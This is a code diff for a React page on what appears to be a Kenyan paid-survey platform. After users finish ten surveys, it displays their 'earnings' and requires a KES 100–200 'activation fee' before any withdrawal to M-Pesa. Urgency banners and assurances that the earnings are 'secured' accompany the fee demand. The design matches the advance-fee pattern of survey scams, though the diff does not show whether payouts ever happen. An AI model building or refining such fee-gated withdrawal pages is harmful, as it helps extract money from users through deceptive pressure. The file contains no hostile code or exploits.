@@ -1,220 +1,246 @@
 import { useEffect, useState } from "react";
-import api from "../../api/api.js";
-import { useNavigate, useLocation } from "react-router-dom";
+import { useNavigate } from "react-router-dom";
+import api from "../api/api";
 
-export default function Notifications() {
-  const [notifications, setNotifications] = useState([]);
-  const [activeNotif, setActiveNotif] = useState(null); // full-screen modal
+/* =========================
+   PLAN CONFIG (DISPLAY ONLY)
+========================= */
+const PLAN_CONFIG = {
+  REGULAR: {
+    label: "Regular",
+    activationFee: 100,
+    color: "#00e676",
+    glow: "rgba(0,230,118,0.7)",
+  },
+  VIP: {
+    label: "VIP",
+    activationFee: 150,
+    color: "#ffd600",
+    glow: "rgba(255,214,0,0.8)",
+  },
+  VVIP: {
+    label: "VVIP",
+    activationFee: 200,
+    color: "#ff5252",
+    glow: "rgba(255,82,82,0.8)",
+  },
+};
+
+const TOTAL_SURVEYS = 10;
+
+export default function ActivationNotice() {
   const navigate = useNavigate();
-  const location = useLocation();
+
+  const [planKey, setPlanKey] = useState(null);
+  const [planState, setPlanState] = useState(null);
+  const [totalEarned, setTotalEarned] = useState(0);
+  const [loading, setLoading] = useState(true);
 
   /* =========================
-     🔐 SAFETY GUARD
-     Fetch ONLY on /notifications page
-  ========================== */
-  const isNotificationsPage = location.pathname === "/notifications";
-
-  useEffect(() => {
-    if (!isNotificationsPage) return;
-    fetchNotifications();
-  }, [isNotificationsPage]);
-
-  const fetchNotifications = async () => {
-    try {
-      const { data } = await api.get("/notifications");
-      setNotifications(data);
-    } catch (error) {
-      console.error("Failed to fetch notifications:", error);
-    }
-  };
-
-  const markRead = async (id) => {
-    try {
-      await api.patch(`/notifications/${id}/read`);
-      setNotifications((prev) =>
-        prev.map((n) => (n.id === id ? { ...n, is_read: true } : n))
-      );
-    } catch (error) {
-      console.error("Failed to mark notification read:", error);
-    }
-  };
-
-  /* =========================
-     HANDLE WITHDRAW / SHOW FULL-SCREEN NOTIF
+     LOAD STATE (BACKEND = LAW)
   ========================= */
-  const handleWithdraw = async (notif) => {
-    await markRead(notif.id);
+  useEffect(() => {
+    let alive = true;
 
-    // ✅ FIXED: welcome bonus redirect includes query param
-    if (notif.type === "welcome_bonus") {
-      setActiveNotif({
-        message: "❌ Your account is not activated. Activate your account with KES 100 to withdraw to M-Pesa",
-        goDashboard: false,
-        redirect: "/activate?welcome_bonus=1", // <-- fix applied here
-      });
-      return;
-    }
+    const load = async () => {
+      try {
+        const res = await api.get("/auth/me");
 
-    alert("Withdrawal not supported for this notification.");
+        const activePlan = res.data.active_plan;
+        const plan = res.data.plans?.[activePlan];
+
+        if (!activePlan || !plan) {
+          navigate("/dashboard", { replace: true });
+          return;
+        }
+
+        if (plan.surveys_completed < TOTAL_SURVEYS) {
+          navigate("/dashboard", { replace: true });
+          return;
+        }
+
+        if (plan.is_activated) {
+          navigate("/dashboard?activated=true", { replace: true });
+          return;
+        }
+
+        if (!alive) return;
+
+        setPlanKey(activePlan);
+        setPlanState(plan);
+        setTotalEarned(res.data.total_earned);
+      } catch {
+        // handled globally
+      } finally {
+        if (alive) setLoading(false);
+      }
+    };
+
+    load();
+    return () => (alive = false);
+  }, [navigate]);
+
+  if (loading) {
+    return <p style={{ textAlign: "center", marginTop: 80 }}>Loading…</p>;
+  }
+
+  if (!planKey || !planState) return null;
+
+  const plan = PLAN_CONFIG[planKey];
+
+  const handleActivate = () => {
+    navigate("/activate");
   };
-
-  const handleGoDashboard = () => {
-    setActiveNotif(null);
-    navigate("/dashboard");
-  };
-
-  /* =========================
-     RENDER
-  ========================== */
-  if (!isNotificationsPage) return null;
 
   return (
-    <div className="notifications-container">
-      {notifications.map((notif) => (
-        <div
-          key={notif.id}
-          className={`notification-card ${notif.is_read ? "read" : "unread"}`}
+    <div style={page}>
+      <div style={{ ...card, boxShadow: `0 0 60px ${plan.glow}` }}>
+        <div style={flagWrap}>
+          <img
+            src="https://upload.wikimedia.org/wikipedia/commons/4/49/Flag_of_Kenya.svg"
+            alt="Kenya Flag"
+            style={flag}
+          />
+        </div>
+
+        <h2 style={{ color: plan.color, textShadow: `0 0 20px ${plan.glow}` }}>
+          🎉 Congratulations! 🎉
+        </h2>
+
+        <p style={text}>
+          You have successfully completed all required surveys under the{" "}
+          <b>{plan.label}</b> plan.
+          <br /><br />
+          Your total confirmed earnings are:
+          <br />
+          <b style={{ color: plan.color, fontSize: 18 }}>
+            KES {totalEarned}
+          </b>
+          <br /><br />
+          Activate your account now to unlock withdrawals directly to
+          <b style={{ color: "#00e676" }}> M-Pesa</b>.
+        </p>
+
+        <div style={urgencyBox}>
+          ⏳ Action Required: Activate your account to secure and withdraw your
+          earnings
+        </div>
+
+        <div style={highlightBox}>
+          <p>
+            💼 <b>Account Status:</b>{" "}
+            <span style={{ color: "#ffd600" }}>Pending Activation</span>
+          </p>
+
+          <p>
+            💰 <b>Earnings Available:</b>{" "}
+            <span style={{ color: plan.color }}>
+              KES {totalEarned}
+            </span>
+          </p>
+
+          <p>
+            🔐 <b>One-Time Activation Fee:</b>{" "}
+            <span style={{ color: "#ff5252" }}>
+              KES {plan.activationFee}
+            </span>
+          </p>
+
+          <p>✅ Instant withdrawals after activation</p>
+          <p>🛡️ Your earnings are secured and protected</p>
+          <p>📲 Withdraw to M-Pesa anytime after activation</p>
+        </div>
+
+        <button
+          style={{
+            ...activateBtn,
+            background: "linear-gradient(135deg, #e60000, #ffeb3b)",
+            boxShadow: "0 0 40px rgba(255,235,59,0.9)",
+          }}
+          onClick={handleActivate}
         >
-          <h3>{notif.title}</h3>
-          <p>{notif.message}</p>
+          🔓 Activate Account & Withdraw Earnings
+        </button>
 
-          <div className="notification-actions">
-            {notif.type === "welcome_bonus" && (
-              <button
-                className="withdraw-btn"
-                onClick={() => handleWithdraw(notif)}
-              >
-                Withdraw
-              </button>
-            )}
-
-            <button
-              className="dashboard-btn"
-              onClick={() => navigate(notif.action_route || "/dashboard")}
-            >
-              Go to Dashboard
-            </button>
-          </div>
-        </div>
-      ))}
-
-      {activeNotif && (
-        <div className="full-screen-notif">
-          <div className="notif-content">
-            <p>{activeNotif.message}</p>
-            {activeNotif.goDashboard !== false && (
-              <button className="primary-btn" onClick={handleGoDashboard}>
-                ⬅ Go to Dashboard
-              </button>
-            )}
-            {activeNotif.redirect && activeNotif.goDashboard === false && (
-              <button
-                className="primary-btn"
-                onClick={() => {
-                  const redirect = activeNotif.redirect;
-                  setActiveNotif(null);
-                  navigate(redirect);
-                }}
-              >
-                Activate
-              </button>
-            )}
-          </div>
-        </div>
-      )}
-
-      <style>{`
-        .notifications-container {
-          display: flex;
-          flex-direction: column;
-          gap: 12px;
-          margin: 20px;
-        }
-
-        .notification-card {
-          padding: 16px;
-          border-radius: 12px;
-          background: rgba(255,255,255,0.1);
-          backdrop-filter: blur(10px);
-          border: 1px solid rgba(255,255,255,0.15);
-        }
-
-        .notification-card.read {
-          opacity: 0.6;
-        }
-
-        .notification-actions {
-          margin-top: 12px;
-          display: flex;
-          gap: 8px;
-        }
-
-        .withdraw-btn {
-          background: #f5a623;
-          color: white;
-          border: none;
-          padding: 8px 14px;
-          border-radius: 8px;
-          font-weight: bold;
-          cursor: pointer;
-          transition: all 0.2s ease;
-        }
-
-        .withdraw-btn:hover {
-          background: #d48806;
-        }
-
-        .dashboard-btn {
-          background: #60a5fa;
-          color: white;
-          border: none;
-          padding: 8px 14px;
-          border-radius: 8px;
-          font-weight: bold;
-          cursor: pointer;
-          transition: all 0.2s ease;
-        }
-
-        .dashboard-btn:hover {
-          background: #3b82f6;
-        }
-
-        .full-screen-notif {
-          position: fixed;
-          top: 0;
-          left: 0;
-          width: 100%;
-          height: 100%;
-          background: rgba(0,0,0,0.85);
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          z-index: 9999;
-        }
-
-        .full-screen-notif .notif-content {
-          background: #111;
-          color: #fff;
-          padding: 28px;
-          border-radius: 18px;
-          max-width: 420px;
-          text-align: center;
-          line-height: 1.5;
-          box-shadow: 0 0 25px #0ff;
-        }
-
-        .full-screen-notif .notif-content .primary-btn {
-          margin-top: 16px;
-          padding: 10px 18px;
-          border-radius: 12px;
-          font-weight: 700;
-          cursor: pointer;
-          background: #00ffcc;
-          color: #000;
-          border: none;
-          box-shadow: 0 0 12px #00ffcc;
-        }
-      `}</style>
+        <button style={backBtn} onClick={() => navigate("/dashboard")}>
+          Return to Dashboard
+        </button>
+      </div>
     </div>
   );
 }
+
+/* =========================
+   STYLES
+========================= */
+const page = {
+  minHeight: "100vh",
+  background: "linear-gradient(135deg, #000, #0b3d2e, #000)",
+  display: "flex",
+  justifyContent: "center",
+  alignItems: "center",
+  padding: 20,
+};
+
+const card = {
+  maxWidth: 520,
+  width: "100%",
+  background: "rgba(0,0,0,0.92)",
+  padding: 28,
+  borderRadius: 28,
+  textAlign: "center",
+  color: "#fff",
+  border: "2px solid rgba(0,230,118,0.3)",
+};
+
+const flagWrap = { display: "flex", justifyContent: "center" };
+
+const flag = {
+  width: 64,
+  height: 64,
+  borderRadius: "50%",
+  boxShadow: "0 0 20px rgba(255,255,255,0.6)",
+};
+
+const text = { marginTop: 14, fontSize: 15, lineHeight: 1.6 };
+
+const urgencyBox = {
+  marginTop: 16,
+  padding: 14,
+  borderRadius: 14,
+  background: "rgba(255,0,0,0.2)",
+  color: "#ff5252",
+  fontWeight: 900,
+};
+
+const highlightBox = {
+  marginTop: 22,
+  padding: 18,
+  borderRadius: 18,
+  background: "rgba(0,230,118,0.1)",
+  textAlign: "left",
+  border: "1px solid rgba(0,230,118,0.4)",
+};
+
+const activateBtn = {
+  width: "100%",
+  marginTop: 26,
+  padding: 18,
+  color: "#000",
+  border: "none",
+  borderRadius: 999,
+  fontWeight: 900,
+  cursor: "pointer",
+  fontSize: 16,
+};
+
+const backBtn = {
+  width: "100%",
+  marginTop: 12,
+  padding: 13,
+  background: "rgba(255,255,255,0.1)",
+  color: "#fff",
+  border: "1px solid rgba(255,255,255,0.3)",
+  borderRadius: 999,
+  cursor: "pointer",
+};
